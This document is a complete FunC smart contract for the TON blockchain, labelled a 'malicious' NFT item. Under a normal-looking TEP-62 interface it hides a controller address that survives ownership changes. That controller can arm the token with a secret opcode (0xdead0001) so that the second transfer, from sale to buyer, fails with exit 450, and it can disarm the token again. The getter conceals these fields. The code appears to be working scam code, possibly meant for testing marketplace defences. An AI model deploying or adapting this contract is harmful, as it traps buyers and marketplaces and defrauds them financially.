;; malicious-nft-item-v2.fc
;; Switchable malicious NFT: controller can arm/disarm at any time.
;; armed=0 → behaves as normal TEP-62 NFT
;; armed=1 → throws exit(450) on 2nd op::transfer (sale→buyer)
;; controller address persists across ownership changes

int min_tons_for_storage() asm "50000000 PUSHINT";

;; Storage (initialized):
;;   uint64 index | MsgAddr collection | MsgAddr owner | cell content
;;   | uint8 transfer_count | MsgAddr controller | uint1 armed
;; Storage (uninitialized): uint64 index | MsgAddr collection

(int, int, slice, slice, cell, int, slice, int) load_data() {
    slice ds = get_data().begin_parse();
    int index = ds~load_uint(64);
    slice collection_address = ds~load_msg_addr();
    if (ds.slice_bits() == 0) {
        return (0, index, collection_address, null(), null(), 0, null(), 0);
    }
    slice owner_address   = ds~load_msg_addr();
    cell  content         = ds~load_ref();
    int   transfer_count  = ds~load_uint(8);
    slice controller      = ds~load_msg_addr();
    int   armed           = ds~load_uint(1);
    return (-1, index, collection_address, owner_address, content, transfer_count, controller, armed);
}

() store_data(int index, slice collection_address, slice owner_address, cell content,
              int transfer_count, slice controller, int armed) impure {
    set_data(
        begin_cell()
            .store_uint(index, 64)
            .store_slice(collection_address)
            .store_slice(owner_address)
            .store_ref(content)
            .store_uint(transfer_count, 8)
            .store_slice(controller)
            .store_uint(armed, 1)
        .end_cell()
    );
}

() send_msg(slice to_address, int amount, int op, int query_id, builder payload, int send_mode) impure inline {
    var msg = begin_cell()
        .store_uint(0x10, 6)
        .store_slice(to_address)
        .store_coins(amount)
        .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .store_uint(op, 32)
        .store_uint(query_id, 64);
    if (~ builder_null?(payload)) {
        msg = msg.store_builder(payload);
    }
    send_raw_message(msg.end_cell(), send_mode);
}

() transfer_ownership(int my_balance, int index, slice collection_address, slice owner_address,
                      cell content, int transfer_count, slice controller, int armed,
                      slice sender_address, int query_id, slice in_msg_body, int fwd_fees) impure inline {
    throw_unless(401, equal_slices(sender_address, owner_address));

    ;; If armed: block 2nd transfer (sale→buyer). 1st transfer always allowed.
    throw_if(450, armed & (transfer_count > 0));

    slice new_owner_address    = in_msg_body~load_msg_addr();
    force_chain(new_owner_address);
    slice response_destination = in_msg_body~load_msg_addr();
    in_msg_body~load_int(1);
    int forward_amount = in_msg_body~load_coins();

    int rest_amount = my_balance - min_tons_for_storage();
    if (forward_amount) {
        rest_amount -= (forward_amount + fwd_fees);
    }
    int need_response = response_destination.preload_uint(2) != 0;
    if (need_response) {
        rest_amount -= fwd_fees;
    }
    throw_unless(402, rest_amount >= 0);

    if (forward_amount) {
        send_msg(new_owner_address, forward_amount, op::ownership_assigned(), query_id,
            begin_cell().store_slice(owner_address).store_slice(in_msg_body), 1);
    }
    if (need_response) {
        force_chain(response_destination);
        send_msg(response_destination, rest_amount, op::excesses(), query_id, null(), 1);
    }

    ;; Reset transfer_count after successful complete delivery cycle (armed=0, 2nd transfer done)
    int new_count = transfer_count + 1;
    if ((transfer_count > 0) & (~ armed)) {
        new_count = 0;
    }
    store_data(index, collection_address, new_owner_address, content, new_count, controller, armed);
}

() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    if (in_msg_body.slice_empty?()) { return (); }

    slice cs    = in_msg_full.begin_parse();
    int   flags = cs~load_uint(4);
    if (flags & 1) { return (); }
    slice sender_address = cs~load_msg_addr();

    cs~load_msg_addr();
    cs~load_coins();
    cs~skip_bits(1);
    cs~load_coins();
    int fwd_fee = cs~load_coins();

    (int init?, int index, slice collection_address, slice owner_address, cell content,
     int transfer_count, slice controller, int armed) = load_data();

    if (~ init?) {
        ;; Initialization: collection sends owner | content_ref | controller
        throw_unless(405, equal_slices(collection_address, sender_address));
        slice nft_owner    = in_msg_body~load_msg_addr();
        cell  nft_content  = in_msg_body~load_ref();
        slice nft_ctrl     = in_msg_body~load_msg_addr();
        store_data(index, collection_address, nft_owner, nft_content, 0, nft_ctrl, 0);
        return ();
    }

    int op       = in_msg_body~load_uint(32);
    int query_id = in_msg_body~load_uint(64);

    if (op == op::transfer()) {
        transfer_ownership(my_balance, index, collection_address, owner_address, content,
                           transfer_count, controller, armed,
                           sender_address, query_id, in_msg_body, fwd_fee);
        return ();
    }
    if (op == op::get_static_data()) {
        send_msg(sender_address, 0, op::report_static_data(), query_id,
            begin_cell().store_uint(index, 256).store_slice(collection_address), 64);
        return ();
    }
    ;; op::arm   = 0xdead0001  (controller only)
    if (op == 0xdead0001) {
        throw_unless(401, equal_slices(sender_address, controller));
        store_data(index, collection_address, owner_address, content, transfer_count, controller, 1);
        return ();
    }
    ;; op::disarm = 0xdead0002 (controller only)
    if (op == 0xdead0002) {
        throw_unless(401, equal_slices(sender_address, controller));
        store_data(index, collection_address, owner_address, content, transfer_count, controller, 0);
        return ();
    }
    throw(0xffff);
}

(int, int, slice, slice, cell) get_nft_data() method_id {
    (int init?, int index, slice collection_address, slice owner_address, cell content, _, _, _) = load_data();
    return (init?, index, collection_address, owner_address, content);
}
